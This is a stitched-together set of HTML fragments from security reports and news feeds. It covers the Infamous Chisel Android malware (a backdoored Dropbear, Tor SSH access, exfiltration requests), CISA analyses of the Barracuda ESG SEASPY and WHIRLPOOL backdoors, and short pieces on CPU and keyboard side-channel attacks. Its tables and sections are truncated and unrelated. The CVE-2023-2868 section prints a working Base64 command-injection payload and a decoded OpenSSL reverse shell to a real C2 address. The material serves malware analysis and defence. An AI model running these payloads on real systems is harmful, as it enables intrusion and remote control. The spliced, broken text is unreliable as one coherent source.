&lt;h3&gt;tcpdump&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;tcpdump&lt;/code&gt; utility (version &lt;code&gt;4.1.1&lt;/code&gt;) is compiled for ARM with no obvious modifications. This provides traffic capturing and monitoring functionality via the command line.&lt;/p&gt;
&lt;h3&gt;Multi-call binaries: db, NDBR_armv7l and NDBR_i686&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;db&lt;/code&gt; utility contains multiple individual utilities which are selected based on the command line parameters supplied:&lt;/p&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;td&gt;

&lt;/td&gt;

&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Creates directories&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The command line help for &lt;code&gt;dropbear&lt;/code&gt;, &lt;code&gt;dropbearkey&lt;/code&gt;, &lt;code&gt;nmap&lt;/code&gt; and &lt;code&gt;scp&lt;/code&gt; can be found in the Appendix&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dropbear&lt;/code&gt;, present within &lt;code&gt;db&lt;/code&gt;, provides secure shell access to the device via the Tor hidden service. IP Tables rules configured allow incoming TCP connections destined for port &lt;code&gt;34371&lt;/code&gt; through the firewall. The Tor utility executed by &lt;code&gt;blob&lt;/code&gt; on the device is configured to provide a hidden service on this port, then forward connections to the local &lt;code&gt;dropbear&lt;/code&gt; instance. The &lt;code&gt;.onion&lt;/code&gt; address has already been exfiltrated enabling the actor to connect to it. Modifications have been made to &lt;code&gt;dropbear&lt;/code&gt; authentication mechanisms.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;scp&lt;/code&gt; utility does not appear to have been modified. The &lt;code&gt;nmap&lt;/code&gt; utility has the same functionality as the version in &lt;code&gt;netd&lt;/code&gt; but is executed manually by actor interaction.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;watchdog&lt;/code&gt;, &lt;code&gt;rmflag&lt;/code&gt;, and &lt;code&gt;mkflag&lt;/code&gt; utilities appear to be additional actor-created code that has been incorporated to perform some configuration for &lt;code&gt;dropbear&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The directory &lt;code&gt;sessions.log.d&lt;/code&gt; is created under &lt;code&gt;/data/local/tmp/&lt;/code&gt;, and puts all standard Dropbear files under this directory alongside the custom actor file &lt;code&gt;remove_file.flag&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;Watchdog&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;watchdog&lt;/code&gt; utility performs setup and executes &lt;code&gt;dropbear&lt;/code&gt;. This setup includes:&lt;/p&gt;
&lt;h5&gt;File and directory creation&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/remove_file.flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;code&gt;remove_file.flag&lt;/code&gt;&amp;nbsp;file is created containing the string &lt;code&gt;run&lt;/code&gt; when any of the multi-call utilities run Dropbear. This will be collected and exfiltrated by&amp;nbsp;&lt;code&gt;netd&lt;/code&gt;&amp;nbsp;giving the actor an indicator that the SSH server is active.&lt;/p&gt;
&lt;h5&gt;Authorized hosts setup&lt;/h5&gt;
&lt;p&gt;A host key is placed into the directory:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/authorized_keys&lt;/code&gt;&lt;/p&gt;
&lt;h5&gt;IP Tables Rules&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;/usr/sbin/iptables&lt;/code&gt; is executed with the parameters:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-A INPUT -p tcp --dport 34371 -j ACCEPT -I&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;mkflag&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;mkflag&lt;/code&gt; utility creates the directories and files that &lt;code&gt;watchdog&lt;/code&gt; creates but does not perform any host file or IP table manipulation, and then runs &lt;code&gt;dropbear&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;rmflag&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;rmflag&lt;/code&gt; utility deletes &lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/remove_file.flag&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;Modified Dropbear functions&lt;/h4&gt;
&lt;p&gt;The actor has modified authentication mechanisms in Dropbear.&lt;/p&gt;
&lt;h5&gt;fill_passwd&lt;/h5&gt;
&lt;p&gt;The Dropbear function &lt;code&gt;fill_passwd&lt;/code&gt; is used to verify that a supplied username is a valid account and return information required to process authentication.&lt;/p&gt;
&lt;p&gt;The unmodified source code for this can be found in the Appendix (Dropbear fill_passwd function)&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;This function calls multiple Linux library functions, &lt;code&gt;getpwnam&lt;/code&gt;, &lt;code&gt;getspnam&lt;/code&gt;, &lt;code&gt;getpwuid&lt;/code&gt;, but in the modified version actor replacement functions are called instead, each of these are discussed below.&lt;/p&gt;
&lt;h5&gt;getpwnam&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getpwnam&lt;/code&gt; Linux library function accepts a username and cross-references it with the passwd file usually stored at &lt;code&gt;/etc/passwd&lt;/code&gt; for the corresponding entry containing the colon concatenated fields:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;username&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user password&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user ID&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;group ID&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user information&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;home directory&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shell program&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;On most modern systems, an &lt;code&gt;x&lt;/code&gt; in the &lt;code&gt;user password&lt;/code&gt; field is used to denote that the password hash is stored in the &lt;code&gt;/etc/shadow&lt;/code&gt; file that requires root privileges to read. On an Android device, there are typically no such files, so the structure that would usually be retrieved from the &lt;code&gt;passwd&lt;/code&gt; file is generated instead.&lt;/p&gt;
&lt;p&gt;The actor has replaced this function with their own, where if a particular username is seen it returns a hard-coded response. If the expected username is not seen, the &lt;code&gt;/etc/passwd&lt;/code&gt; file is checked for the corresponding username as normal.&lt;/p&gt;
&lt;h5&gt;getpwuid&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getpwuid&lt;/code&gt; Linux library accepts a uid and returns the corresponding structure above typically from the &lt;code&gt;/etc/passwd&lt;/code&gt; file. The actor has replaced this function to check for the &lt;code&gt;uid&lt;/code&gt; of &lt;code&gt;0xbeef&lt;/code&gt; and return the hard-coded structure detailed above, if found. If &lt;code&gt;0xbeef&lt;/code&gt; is not seen, it will revert to checking &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
&lt;h5&gt;getspnam&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getspnam&lt;/code&gt; Linux library function accepts a username and cross-references it with the shadow file usually stored at &lt;code&gt;/etc/shadow&lt;/code&gt; for the corresponding entry that contains the dollar concatenated fields:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;salt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hash&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Typically, on an Android device, this function would return NULL, but the actor replacement function uses the Linux version.&lt;/p&gt;
&lt;p&gt;There does not appear to be any modifications other than those detailed above, but there may be other patches implemented.&lt;/p&gt;
&lt;h4&gt;NDBR&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;NDBR_armv7l&lt;/code&gt; and &lt;code&gt;NDBR_i686&lt;/code&gt; utilities contain multiple individual utilities compiled for ARM and x86 respectively. They both include the above authentication mechanism modification, although with different credentials, and otherwise appear to be the same.&lt;/p&gt;
&lt;p&gt;These utilities also have some functionality overlap with the &lt;code&gt;VPNFilter&lt;/code&gt; malware but appear to be an evolution.&lt;a href="https://blog.talosintelligence.com/vpnfilter-part-3/"&gt;[1]&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;killer&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;killer&lt;/code&gt; is a simple program, the main purpose of which is to terminate &lt;code&gt;netd&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It achieves this by performing the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Iterates through all Process Identifiers (PIDs) in the range 2 through to &lt;code&gt;0x3FFFFF&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the first line of &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/status&lt;/code&gt; for the string &lt;code&gt;netd&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the target of the link referenced at &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/exe&lt;/code&gt; against &lt;code&gt;netd&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the executable name is not &lt;code&gt;netd_&lt;/code&gt; (The legitimate backup executed by the malicious &lt;code&gt;netd&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Terminates the malicious netd leaving the legitimate &lt;code&gt;netd_&lt;/code&gt; running.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;Communications&lt;/h2&gt;

&lt;h3&gt;netd file exfiltration&lt;/h3&gt;
&lt;p&gt;When a file is to be exfiltrated, a Transport Layer Security (TLS) connection is initiated to a hard-coded local IP and port.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; This local IP address is likely a local port forward to relay the network traffic over a secure channel, such as a Virtual Private Network (VPN) configured on the device. VPN services are often configured in this way, giving the actor a means to exfiltrate information from the network which blends in with expected encrypted network traffic.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;If a connection to the local IP and port fails, a hard-coded domain is used as a fallback connection. The IP address for this domain is resolved using a request to &lt;code&gt;dns.google&lt;/code&gt;.&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;POST /dns-query HTTP/1.1&lt;/p&gt;
&lt;p&gt;Host: dns.google&lt;/p&gt;
&lt;p&gt;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0&lt;/p&gt;
&lt;p&gt;Accept: application/dns-message&lt;/p&gt;
&lt;p&gt;Content-Type: application/dns-message&lt;/p&gt;
&lt;p&gt;Content-Length:&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; The hard-coded user agent that relates to a Microsoft Windows operating system would raise suspicion originating from an Android device. But since all the communications are under TLS, it would make inspecting the HTTP headers difficult.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The following HTTP Post request is used to exfiltrate data:&lt;/p&gt;

&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope="col"&gt;
&lt;p&gt;&lt;strong&gt;Data structure&lt;/strong&gt;&lt;/p&gt;
&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;POST /server.php?ver=16&amp;amp;&lt;strong&gt;bid&lt;/strong&gt;=%s&amp;amp;&lt;strong&gt;type&lt;/strong&gt;=%d HTTP/1.1&lt;/p&gt;
&lt;p&gt;User-Agent: curl/7.47&lt;/p&gt;
&lt;p&gt;Host:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Path&lt;/strong&gt;: %s&lt;/p&gt;
&lt;p&gt;Content-Type: application/octet-stream&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Length&lt;/strong&gt;: %d&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;Raw File&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;

&lt;li&gt;&lt;code&gt;0&lt;/code&gt; is used for the file searches, triage script and configurations files.&lt;/li&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;The Infamous Chisel components are low to medium sophistication and appear to have been developed with little regard to defense evasion or concealment of malicious activity.&lt;/p&gt;
&lt;p&gt;The searching of specific files and directory paths that relate to military applications and exfiltration of this data reinforces the intention to gain access to these networks. Although the components lack basic obfuscation or stealth techniques to disguise activity, the actor may have deemed this not necessary, since many Android devices do not have a host-based detection system.&lt;/p&gt;
&lt;p&gt;Two interesting techniques are present in Infamous Chisel:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the replacement of the legitimate &lt;code&gt;netd&lt;/code&gt; executable to maintain persistence.&lt;/li&gt;
&lt;li&gt;the modification of the authentication function in the components that include &lt;code&gt;dropbear&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These techniques require a good level of C++ knowledge to make the alterations and an awareness of Linux authentication and boot mechanisms.&lt;/p&gt;
&lt;p&gt;Even with the lack of concealment functions, these components present a serious threat because of the impact of the information they can collect.&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained a variant of the WHIRLPOOL backdoor. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			WHIRLPOOL is a backdoor that establishes a Transport Layer Security (TLS) reverse shell to the Command-and-Control (C2) server.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload and other backdoors, see CISA Alert: CISA Releases Malware Analysis Reports on Barracuda Backdoors.&lt;/p&gt;

&lt;p&gt;The file 'ssld' is a Linux ELF reverse shell and is a variant of WHIRLPOOL malware used on the Barracuda Email Security Gateway (ESG) device (Figure 1). The file looks for an encoded string with a '.io' extension (Figure 2). The string will be decoded and the data will be passed as the C2 which will include the Internet Protocol (IP) address and port number used to establish a reverse shell.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;

&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

Yesterday, different security researchers published details on two different vulnerabilities, one affecting multiple generations of Intel processors and another affecting the newest AMD CPUs. "&lt;a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00828.html"&gt;Downfall&lt;/a&gt;" and "&lt;a href="https://www.amd.com/en/resources/product-security/bulletin/amd-sb-7005.html"&gt;Inception&lt;/a&gt;" (respectively) are different bugs, but both involve modern processors' extensive use of speculative execution (a la the original &lt;a href="https://arstechnica.com/gadgets/2018/01/meltdown-and-spectre-every-modern-processor-has-unfixable-security-flaws/"&gt;Meltdown and Spectre bugs&lt;/a&gt;), both are described as being of "medium" severity, and both can be patched either with OS-level microcode updates or firmware updates with fixes incorporated.&lt;/p&gt;
&lt;p&gt;AMD and Intel have both already released OS-level microcode software updates to address both issues. Both companies have also said that they're not aware of any active in-the-wild exploits of either vulnerability. Consumer, workstation, and server CPUs are all affected, making patching particularly important for server administrators.&lt;/p&gt;
&lt;p&gt;It will be up to your PC, server, or motherboard manufacturer to release firmware updates with the fixes after Intel and AMD make them available.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2023/08/data-leaking-downfall-bug-affects-six-generations-of-intel-pc-and-server-cpus/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained four malware samples - including SEASPY and WHIRLPOOL backdoors. The device was compromised by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			SEASPY is a persistent and passive backdoor that masquerades as a legitimate Barracuda service “BarracudaMailService” that allows the threat actors to execute arbitrary commands on the ESG appliance.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			WHIRLPOOL is a backdoor that establishes a Transport Layer Security (TLS) reverse shell to the Command-and-Control (C2) server.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload, a second SEASPY backdoor variant, and the SUBMARINE backdoor, see CISA Alert: &lt;a href="https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors"&gt;CISA Releases Malware Analysis Reports on Barracuda Backdoors&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit Executable and Linkable Format (ELF) file that has been identified as a "SEASPY" malware variant installed as a system service. The malware is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the Threat Actor's (TA's) C2 through TCP packets. When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (Simple Mail Transfer Protocol (SMTP)) and TCP port 587. It checks the network packet captured for a hard-coded string "oXmp". When the right sequence of packets is captured, it establishes a TCP reverse shell to the TA's C2 server for further exploitation. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;

&lt;p&gt;This artifact is an initialization script. Upon its execution it sets terminal settings to default using the 'stty sane' command. It then runs through the process of setting a runlevel variable and stops other services that were started by a previous runlevel. It also kills any services that are running on the current runlevel. Next, the script will start its associated services at the current runlevel. After logging functionalities are started, the script will then check if the runlevel is 3, which will result in the terminal screen being cleared using /usr/bin/clear. Finally, the script contains the command “/sbin/BarracudaMailService eth0” at the end. BarracudaMailService will be started automatically when the initialization script is run on the network interface eth0. BarracudaMailService is a known name for the SEASPY backdoor.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit ELF file that has been identified as a "SEASPY" malware variant installed as a system service. This variant of SEASPY has had its symbols stripped. The malware is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the TA's C2 through TCP packets.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (SMTP) and TCP port 587. It checks the network packet captured for a hard-coded string "TfuZ". When the right sequence of packets is captured this SEASPY variant launches an authentication sequence prior to launching the reverse shell. Once the TA authenticates, the malware starts a reverse shell on the infected system. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin argument--&lt;br /&gt;&lt;br /&gt;

&lt;p&gt;This artifact is a 32-bit ELF file that has been identified as a malware variant named "WHIRLPOOL". The malware takes two arguments (C2 IP and port number) from a module to establish a Transport Layer Security (TLS) reverse shell. The module that passes the arguments was not available for analysis.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In their paper &lt;em&gt;&lt;a href="https://ieeexplore.ieee.org/abstract/document/10190721"&gt;A Practical Deep Learning-Based Acoustic Side Channel Attack on Keyboards&lt;/a&gt;&lt;/em&gt; (&lt;a href="https://arxiv.org/pdf/2308.01074.pdf"&gt;full PDF&lt;/a&gt;), UK researchers Joshua Harrison, Ehsan Toreini, and Marhyam Mehrnezhad claim that the trio of ubiquitous machine learning, microphones, and video calls "present a greater threat to keyboards than ever." Laptops, in particular, are more susceptible to having their keyboard recorded in quieter public areas, like coffee shops, libraries, or offices, the paper notes. And most laptops have uniform, non-modular keyboards, with similar acoustic profiles across models.&lt;/p&gt;
&lt;p&gt;Previous attempts at keylogging VoIP calls, without physical access to the subject, achieved &lt;a href="https://arxiv.org/pdf/1609.09359.pdf"&gt;91.7 percent top-5 accuracy over Skype in 2017&lt;/a&gt; and &lt;a href="https://dl.acm.org/doi/10.1145/3176258.3176341"&gt;74.3 percent accuracy in VoIP calls in 2018&lt;/a&gt;. Combining the output of the keystroke interpretations with a "hidden Markov model" (HMM), which guesses at more-likely next-letter outcomes and could correct "hrllo" to "hello," saw one prior side channel study's accuracy jump from 72 to 95 percent—though that was &lt;a href="https://www.usenix.org/legacy/events/sec10/tech/full_papers/Backes.pdf"&gt;an attack on dot-matrix printers&lt;/a&gt;. The Cornell researchers believe their paper is the first to make use of the recent sea change in neural network technology, including &lt;a href="https://towardsdatascience.com/illustrated-self-attention-2d627e33b20a"&gt;self-attention layers&lt;/a&gt;, to propagate an audio side channel attack.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2023/08/type-softly-researchers-can-guess-keystrokes-by-sound-with-93-accuracy/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained 14 malware samples comprised of Barracuda exploit payloads and reverse shell backdoors. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The payload triggers a command injection (exploiting CVE-2023-2868), leading to dropping and execution of reverse shells on the ESG appliance. The reverse shells establish backdoor communications via OpenSSL with threat actor command and control (C2) servers. The actors delivered this payload to the victim via a phishing email with a malicious .tar attachment.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is related to the vulnerability CVE-2023-2868 in the Barracuda ESG exploit to execute a reverse shell payload on certain ESG appliances. This sample contains a Base64 encoded block that upon decoding references multiple archive files. There are multiple file references in the block, however, only one contains the exploit code in the title and can be found between two single quotes and backticks '`abcdefg=payload`' (Figure 1). This payload triggers a command injection and upon successful exploitation of the affected system the encoded commands are able to run and provide the Threat Actor (TA) with a response.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Encoded Payload--&lt;br /&gt;&lt;br /&gt;
			'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;"ech"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'&lt;br /&gt;&lt;br /&gt;
			--End Encoded Payload--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The encoded block above decodes to a reverse shell seen below.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Decoded Command--&lt;br /&gt;&lt;br /&gt;
			setsid sh -c "mkfifo /tmp/p;sh -i &amp;lt;/tmp/p 2&amp;gt;&amp;amp;1|openssl s_client -quiet -connect 107[.]148[.]223[.]196:8080 &amp;gt;/tmp/p 2&amp;gt;/dev/null;rm /tmp/p"&lt;br /&gt;&lt;br /&gt;
			--End Decoded Command--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			This reverse shell starts a new session and sets it to run in the background. Then it creates the named pipe "/tmp/p" that it will use as a point to transfer the commands that will be executed.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The rest of the command is seen using OpenSSL to create a client that connects to the Command-and-Control (C2) at Internet Protocol (IP) address “107[.]148[.]223[.]196” and port number “8080.” The OpenSSL command also suppresses session and certificate output info using -quiet flag and errors are discarded for stealth in the /dev/null directory. Finally, the named pipe "tmp/p" is removed when the OpenSSL connection is closed.&lt;/p&gt;

&lt;p&gt;This artifact contains a payload that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware Base64 decodes and executes the reverse shell code. The reverse shell establishes connections using the "OpenSSL" to the C2 IP "107[.]148[.]223[.]196" and port “443” and redirects the standard input and output to the named pipe at "/tmp/p" and then removes "/tmp/p" after the connection is closed.&lt;br /&gt;&lt;br /&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is dropped by two different .tar files and contains a payload inside its filename that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware Base64 decodes and executes the reverse shell code. The reverse shells establish connections using the "OpenSSL" to the C2 IP address "107[.]148[.]223[.]196" and ports “8080” or "443." The standard input and output are redirected to the named pipe "/tmp/p" and then removes "tmp/p" after the connection is closed.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The contents within the two dropped files are the same and is a string "oGh7ohc4Akeo8ahXeequei7A09302." This accounts for the two samples having the same hash, however, payload contents are different within the names of these files. When the payload executes, the commands slightly differ in the use of the port number as seen below.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
